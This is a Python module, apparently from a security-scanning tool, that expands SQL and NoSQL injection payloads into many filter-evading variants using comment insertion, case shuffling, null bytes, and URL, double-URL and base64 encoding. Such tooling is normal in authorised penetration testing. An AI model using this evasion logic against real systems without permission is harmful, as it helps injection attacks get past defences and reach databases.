from __future__ import annotations

import re
from base64 import b64encode
from collections.abc import Callable
from dataclasses import dataclass
from math import ceil
from urllib.parse import quote

SQL_FAMILIES = {"sqli", "error_based", "union_based", "time_based", "stacked", "newsql"}
DEFAULT_EXPANDED_LIMITS = {
    "sqli": 640,
    "error_based": 320,
    "union_based": 240,
    "time_based": 240,
    "stacked": 180,
    "nosqli": 420,
    "newsql": 220,
}


@dataclass(frozen=True)
class PayloadVariant:
    payload: str
    family: str
    source: str
    mutations: tuple[str, ...] = ()


def _dedupe_strings(items: list[str]) -> list[str]:
    ordered: list[str] = []
    seen: set[str] = set()
    for item in items:
        value = str(item or "").strip()
        if not value or value in seen:
            continue
        seen.add(value)
        ordered.append(value)
    return ordered


def _dedupe_variants(items: list[PayloadVariant]) -> list[PayloadVariant]:
    ordered: list[PayloadVariant] = []
    seen: set[str] = set()
    for item in items:
        value = item.payload.strip()
        if not value or value in seen:
            continue
        seen.add(value)
        ordered.append(item)
    return ordered


def _alternate_case(payload: str) -> str:
    upper = True
    out: list[str] = []
    for char in payload:
        if char.isalpha():
            out.append(char.upper() if upper else char.lower())
            upper = not upper
        else:
            out.append(char)
    return "".join(out)


def _split_keywords(payload: str, keywords: tuple[str, ...]) -> str:
    transformed = payload
    for keyword in keywords:
        lower = keyword.lower()
        replacement = f"{keyword[:2]}/**/{keyword[2:]}" if len(keyword) > 3 else keyword
        transformed = transformed.replace(keyword, replacement)
        transformed = transformed.replace(lower, replacement.lower())
    return transformed


def _replace_whitespace(payload: str, replacement: str) -> str:
    return payload.replace(" ", replacement)


def _replace_operators(payload: str) -> str:
    updated = payload.replace(" OR ", " || ").replace(" or ", " || ")
    updated = updated.replace(" AND ", " && ").replace(" and ", " && ")
    updated = updated.replace(" = ", " LIKE ")
    updated = updated.replace("1=1", "1 BETWEEN 1 AND 1")
    updated = updated.replace("1=2", "1 BETWEEN 2 AND 1")
    return updated


def _wrap_parentheses(payload: str) -> str:
    return f"({payload})"


def _encode_url(payload: str) -> str:
    return quote(payload, safe="")


def _encode_double_url(payload: str) -> str:
    return quote(quote(payload, safe=""), safe="")


def _encode_base64(payload: str) -> str:
    return b64encode(payload.encode("utf-8")).decode("ascii")


def _unicode_quotes(payload: str) -> str:
    return payload.replace("'", "＇").replace('"', "＂")


def _null_byte(payload: str) -> str:
    return f"{payload}%00"


def _null_byte_keywords(payload: str) -> str:
    def rewrite(match: re.Match[str]) -> str:
        token = match.group(0)
        return "%00".join(token)

    return re.sub(
        r"(?i)\b(select|union|where|from|and|or|sleep|waitfor|benchmark)\b", rewrite, payload
    )


def _json_compact(payload: str) -> str:
    return payload.replace(" ", "")


def _unicode_dollar(payload: str) -> str:
    return payload.replace("$", "\\u0024")


def _parenthesize_arrays(payload: str) -> str:
    if payload.startswith("[") and payload.endswith("]"):
        return f'{{"pipeline":{payload}}}'
    return payload


def _concat_to_pipe(payload: str) -> str:
    return re.sub(r"(?i)concat\(([^,]+),\s*([^)]+)\)", r"\1||\2", payload)


def _concat_to_plus(payload: str) -> str:
    return re.sub(r"(?i)concat\(([^,]+),\s*([^)]+)\)", r"\1+\2", payload)


def _keywords_for_family(family: str) -> tuple[str, ...]:
    if family in SQL_FAMILIES:
        return (
            "SELECT",
            "UNION",
            "WHERE",
            "FROM",
            "AND",
            "OR",
            "SLEEP",
            "WAITFOR",
            "BENCHMARK",
            "CASE",
            "WHEN",
            "THEN",
        )
    return (
        "$where",
        "$regex",
        "$expr",
        "$jsonSchema",
        "$gt",
        "$lt",
        "$gte",
        "$lte",
        "$ne",
        "$or",
        "$and",
    )


def _strategy_specs(family: str) -> tuple[tuple[str, Callable[[str], str]], ...]:
    if family in SQL_FAMILIES:
        keywords = _keywords_for_family(family)
        return (
            ("case-shuffle", _alternate_case),
            ("space2comment", lambda payload: _replace_whitespace(payload, "/**/")),
            ("space2tab", lambda payload: _replace_whitespace(payload, "\t")),
            ("space2newline", lambda payload: _replace_whitespace(payload, "\n")),
            ("space2vtab", lambda payload: _replace_whitespace(payload, "\x0b")),
            ("keyword-comment", lambda payload: _split_keywords(payload, keywords)),
            ("operator-alias", _replace_operators),
            ("paren-wrap", _wrap_parentheses),
            ("keyword-null-byte", _null_byte_keywords),
            ("concat-pipe", _concat_to_pipe),
            ("concat-plus", _concat_to_plus),
            ("url-encode", _encode_url),
            ("double-url-encode", _encode_double_url),
            ("base64", _encode_base64),
            ("unicode-quotes", _unicode_quotes),
            ("null-byte", _null_byte),
        )
    return (
        ("json-compact", _json_compact),
        ("unicode-dollar", _unicode_dollar),
        ("space2tab", lambda payload: _replace_whitespace(payload, "\t")),
        ("space2newline", lambda payload: _replace_whitespace(payload, "\n")),
        ("space2vtab", lambda payload: _replace_whitespace(payload, "\x0b")),
        ("paren-wrap", _wrap_parentheses),
        ("pipeline-wrap", _parenthesize_arrays),
        ("url-encode", _encode_url),
        ("double-url-encode", _encode_double_url),
        ("base64", _encode_base64),
        ("unicode-quotes", _unicode_quotes),
        ("null-byte", _null_byte),
    )


def generate_payload_variants(
    payload: str,
    *,
    family: str,
    source: str = "catalog",
    max_variants: int = 16,
    max_depth: int = 2,
) -> list[PayloadVariant]:
    family_name = str(family or "sqli").strip().lower()
    max_variants = max(1, int(max_variants or 1))
    max_depth = max(1, int(max_depth or 1))

    base = PayloadVariant(
        payload=str(payload).strip(), family=family_name, source=source, mutations=()
    )
    if not base.payload:
        return []

    ordered: list[PayloadVariant] = [base]
    seen = {base.payload}
    frontier = [base]
    strategies = _strategy_specs(family_name)

    for _depth in range(max_depth):
        next_frontier: list[PayloadVariant] = []
        for current in frontier:
            for name, transform in strategies:
                try:
                    candidate_payload = str(transform(current.payload)).strip()
                except Exception:
                    continue
                if (
                    not candidate_payload
                    or candidate_payload in seen
                    or candidate_payload == current.payload
                ):
                    continue
                candidate = PayloadVariant(
                    payload=candidate_payload,
                    family=family_name,
                    source=source,
                    mutations=(*current.mutations, name),
                )
                ordered.append(candidate)
                next_frontier.append(candidate)
                seen.add(candidate_payload)
                if len(ordered) >= max_variants:
                    return ordered
        frontier = next_frontier
        if not frontier:
            break
    return ordered


def build_payload_catalog(
    family: str,
    base_payloads: list[str],
    *,
    max_payloads: int | None = None,
    max_depth: int = 2,
) -> list[str]:
    family_name = str(family or "sqli").strip().lower()
    deduped = _dedupe_strings(base_payloads)
    if not deduped:
        return []

    limit = (
        max_payloads
        if max_payloads is not None
        else DEFAULT_EXPANDED_LIMITS.get(family_name, len(deduped))
    )
    limit = max(1, int(limit))
    if len(deduped) >= limit:
        return deduped[:limit]

    per_payload = max(6, min(20, ceil(limit / max(len(deduped), 1))))
    variants: list[PayloadVariant] = []
    for item in deduped:
        variants.extend(
            generate_payload_variants(
                item,
                family=family_name,
                source="catalog",
                max_variants=per_payload,
                max_depth=max_depth,
            )
        )
        if len(_dedupe_variants(variants)) >= limit:
            break

    return [item.payload for item in _dedupe_variants(variants)[:limit]]


__all__ = [
    "DEFAULT_EXPANDED_LIMITS",
    "PayloadVariant",
    "build_payload_catalog",
    "generate_payload_variants",
]
